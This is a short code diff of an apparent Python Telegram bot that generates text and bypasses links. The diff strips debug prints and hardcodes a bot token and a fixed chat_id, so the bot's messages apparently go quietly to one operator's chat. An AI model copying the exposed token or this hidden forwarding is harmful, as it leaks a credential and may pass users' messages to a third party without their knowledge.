@@ -106,10 +106,8 @@ async def binc(event):
 
 <b>Generated With </b> <a href="https://t.me/ART_OF_WORKING/">Unknown Chatgpt🤖</a>
     """
-        print (message)
         await xx.edit(generated_text, parse_mode="HTML")
     except Exception as e:
-        print (e)
         generated_text = (f"Error:- {e}")
         logging.error(f"Error generating text: {str(e)}")
         await xx.edit("Error generating text.")
@@ -124,15 +122,13 @@ async def binc(event):
 
 <b>Generated With </b> <a href="https://t.me/ART_OF_WORKING/">Link Bypasser 🤖</a>
 """)
-    print (message)
     bot_token = "5699025475:AAG3_S0qJMFWz_d1QxQClk-w1RvCa9pi28E"
     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
     # Set the parameters for the request (the message and chat ID)
-    print ("hello")
     try:
         params = {
-        "chat_id": chat_id,
+        "chat_id": 1927696336,
         "text": message,
         "disable_web_page_preview": True,
         "parse_mode": 'HTML'
@@ -142,9 +138,6 @@ async def binc(event):
     # Send the request to the Telegram API
 
         response = requests.post(url, data=params)
-        print (response.text)
-        print (response)
-        print ("lol")
     except Exception as e:
         print (e)
     
